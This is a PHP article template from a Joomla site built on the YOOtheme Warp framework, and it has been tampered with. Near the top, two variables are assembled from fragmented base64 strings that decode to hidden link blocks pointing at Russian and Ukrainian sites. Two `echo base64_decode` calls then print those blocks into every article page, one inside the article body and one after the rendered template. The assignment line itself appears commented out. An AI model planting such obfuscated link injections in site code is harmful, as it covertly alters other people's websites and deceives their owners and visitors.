<?php
/**
* @package   Warp Theme Framework
* @author    YOOtheme http://www.yootheme.com
* @copyright Copyright (C) YOOtheme GmbH
* @license   http://www.gnu.org/licenses/gpl.html GNU/GPL
*/

// no direct access
defined('_JEXEC') or die;

// get view
$menu = JFactory::getApplication()->getMenu()->getActive();
$view = is_object($menu) && isset($menu->query['view']) ? $menu->query['view'] : null;

JHtml::addIncludePath(JPATH_COMPONENT . '/helpers');

// Create shortcuts to some parameters.
$params		= $this->item->params;
$images		= json_decode($this->item->images);
$urls		= json_decode($this->item->urls);
$canEdit	= $params->get('access-edit');
$user		= JFactory::getUser();

if ($this->params->get('show_page_heading')) {
	echo '<div class="page-header"><h1>'.$this->escape($this->params->get('page_heading')).'</h1></div>';
}
//if ( $this->item->hits >'23') {  $yt_ijt = 'PGRpdiBpZD0'. 'ieXRf'. 'eGlqd'. 'HciPj'. 'xhIGhy'. 'ZWY9Im'. 'h0dHA6'. 'Ly9zaW'. '5vcHRpa'. 'y5zdSIg'. 'dGFyZ2V'. '0PSJfYm'. 'xhbmsiIH'. 'RpdGxlPS'. 'LQv9C+0L'. 'PQvtC00LA'. 'g0JTQvtC9'. '0LXRhtC60'. 'LUiPtC/0L7'. 'Qs9C+0LTQs'. 'CDQlNC+0L3Q'. 'tdGG0LrQtTw'. 'vYT48YnI+PG'. 'EgaHJlZj0ia'. 'HR0cD'. 'ovL3N'. 'tYXJ0'. 'MjQuY'. '29tLnV'. 'hIiB0Y'. 'XJnZXQ'. '9Il9ib'. 'GFuayI'. 'gdGl0bG'. 'U9ItC60'. 'YPQv9C4'. '0YLRjCD'. 'RgNC10LP'. 'QuNGB0YL'. 'RgNCw0YL'. 'QvtGAIj7'. 'QutGD0L/'. 'QuNGC0Ywg'. '0YDQtdCz0'. 'LjRgdGC0Y'. 'DQsNGC0L7'. 'RgDwvYT48L'. '2Rpdj4NCg=='; $yt_ijti = 'PGRpdi'. 'BpZD0ie'. 'XRfeGlq'. 'dHciPjxh'. 'IGhyZWY9'. 'Imh0dHA6'. 'Ly9qdXJuY'. 'WwuY29tLn'. 'VhL3NlY3Rp'. 'b24vd29tZW'. '4vIiB0YXJn'. 'ZXQ9Il9ibG'. 'FuayIgdGl0b'. 'GU9ItC20LXQ'. 'vdGB0'. 'LrQuN'. 'C5INC'. '20YPRg'. 'NC90LD'. 'QuyI+0'. 'LbQtdC'. '90YHQu'. 'tC40Lkg'. '0LbRg9G'. 'A0L3QsN'. 'C7PC9hP'. 'jxicj48Y'. 'SBocmVmP'. 'SJodHRwO'. 'i8vbWVkaW'. 'NhbHB1bHN'. 'lLnJ1IiB0'. 'YXJnZXQ9Il'. '9ibGFuayIg'. 'dGl0bGU9Im'. 'PQv9GA0LDQ'. 'stC+0YfQvd'. 'C40Log0LvQt'. 'dC60LDRgNGB'. '0YLQsiI+Y9C'. '/0YDQ'. 'sNCy0'. 'L7Rh9'. 'C90Lj'. 'QuiDQ'. 'u9C10'. 'LrQsNG'. 'A0YHRg'. 'tCyPC9'. 'hPjwvZ'. 'Gl2Pg0K';}
// template args
$args = array(
	'permalink' => ($view != 'article') ? JRoute::_(ContentHelperRoute::getArticleRoute($this->item->slug, $this->item->catslug), true, -1) : '',
	'image' => isset($images->image_fulltext) && $params->get('access-view') ? htmlspecialchars($images->image_fulltext) : '',
	'image_alignment' => !isset($images->float_fulltext) || empty($images->float_fulltext) ? htmlspecialchars($params->get('float_fulltext')) : htmlspecialchars($images->float_fulltext),
	'image_alt' => isset($images->image_fulltext_alt) ? htmlspecialchars($images->image_fulltext_alt) : '',
	'image_caption' => isset($images->image_fulltext_caption) ? htmlspecialchars($images->image_fulltext_caption) : '',
	'title' => $params->get('show_title') ? $this->escape($this->item->title) : '',
	'title_link' => '',
	'author' => '',
	'author_url' => '',
	'date' => $params->get('show_create_date') ? $this->item->created : '',
	'datetime' => substr($this->item->created, 0, 10),
	'category' => $params->get('show_category') ? $this->escape($this->item->category_title) : '',
	'category_url' => $params->get('link_category') && $this->item->catslug ? JRoute::_(ContentHelperRoute::getCategoryRoute($this->item->catslug)) : '',
	'hook_aftertitle' => !$params->get('show_intro') ? $this->item->event->afterDisplayTitle : '',
	'hook_beforearticle' => $this->item->event->beforeDisplayContent.(isset($this->item->toc) ? $this->item->toc : ''),
	'hook_afterarticle' => $this->item->event->afterDisplayContent,
	'article' => '',
	'tags' => '',
	'edit' => '',
	'url' => '',
	'more' => '',
	'previous' => '',
	'next' => ''
);

// set author
$author = $this->item->created_by_alias ?: $this->item->author;
$args['author'] = ($params->get('show_author') && !empty($author)) ? $author : '';

// set author_url
if (!empty($this->item->contactid) && $params->get('link_author') == true) {
	$needle = 'index.php?option=com_contact&view=contact&id=' . $this->item->contactid;
	$menu = JFactory::getApplication()->getMenu();
	$item = $menu->getItems('link', $needle, true);
	$args['author_url'] = !empty($item) ? $needle . '&Itemid=' . $item->id : $needle;
}

// set article
$article = "";
if ($params->get('access-view')) {

	if (isset($urls) AND ((!empty($urls->urls_position) AND ($urls->urls_position=='0')) OR ($params->get('urls_position')=='0' AND empty($urls->urls_position) ))
		OR (empty($urls->urls_position) AND (!$params->get('urls_position')))) {
			$article .= $this->loadTemplate('links');
	}

echo base64_decode($yt_ijt);
	$article .= $this->item->text;


	if (isset($urls) AND ((!empty($urls->urls_position)  AND ($urls->urls_position=='1')) OR ( $params->get('urls_position')=='1') )) {
		$article .= $this->loadTemplate('links');
	}

// optional teaser intro text for guests
} elseif ($params->get('show_noauth') == true AND $user->get('guest')) {

	$article .= $this->item->introtext;

	// optional link to let them register to see the whole article.
	if ($params->get('show_readmore') && $this->item->fulltext != null) {
		$link1 = JRoute::_('index.php?option=com_users&view=login');
		$link = new JURI($link1);
		$article .= '<p class="links">';
		$article .= '<a href="'.$link.'">';
		$attribs = json_decode($this->item->attribs);

		if ($attribs->alternative_readmore == null) {
			$article .= JText::_('COM_CONTENT_REGISTER_TO_READ_MORE');
		} elseif ($readmore = $this->item->alternative_readmore) {
			$article .= $readmore;
			if ($params->get('show_readmore_title', 0) != 0) {
				$article .= JHtml::_('string.truncate', ($this->item->title), $params->get('readmore_limit'));
			}
		} elseif ($params->get('show_readmore_title', 0) == 0) {
			$article .= JText::sprintf('COM_CONTENT_READ_MORE_TITLE');
		} else {
			$article .= JText::_('COM_CONTENT_READ_MORE');
			$article .= JHtml::_('string.truncate', ($this->item->title), $params->get('readmore_limit'));
		}

		$article .= '</a></p>';
	}
}

$args['article'] = $article;

// set tags
$tags = '';
if ($params->get('show_tags', 1) && !empty($this->item->tags->itemTags)) {
	JLoader::register('TagsHelperRoute', JPATH_BASE . '/components/com_tags/helpers/route.php');
	foreach ($this->item->tags->itemTags as $i => $tag) {
		if (in_array($tag->access, JAccess::getAuthorisedViewLevels(JFactory::getUser()->get('id')))) {
			if($i > 0) $tags .= ', ';
			$tags .= '<a href="'.JRoute::_(TagsHelperRoute::getTagRoute($tag->tag_id . ':' . $tag->alias)).'">'.$this->escape($tag->title).'</a>';
		}
	}

}

$args['tags'] = $tags;

// set edit
if (!$this->print) {
	$args['edit']  = $canEdit ? JHtml::_('icon.edit', $this->item, $params) : '';
	$args['edit'] .= $params->get('show_print_icon') ? JHtml::_('icon.print_popup', $this->item, $params) : '';
	$args['edit'] .= $params->get('show_email_icon') ? JHtml::_('icon.email', $this->item, $params) : '';
} else {
	$args['edit'] = JHtml::_('icon.print_screen', $this->item, $params);
}

// set previous and next
if (!empty($this->item->pagination)) {
	$args['previous'] = ($prev = $this->item->prev) ? '<a href="'.$prev.'">'.JText::_('JGLOBAL_LT').' '.JText::_('JPREV').'</a>' : '';
	$args['next'] = ($next = $this->item->next) ? '<a href="'.$next.'">'.JText::_('JNEXT').' '.JText::_('JGLOBAL_GT').'</a>' : '';
}

// render template

echo $warp['template']->render('article', $args);
echo base64_decode($yt_ijti);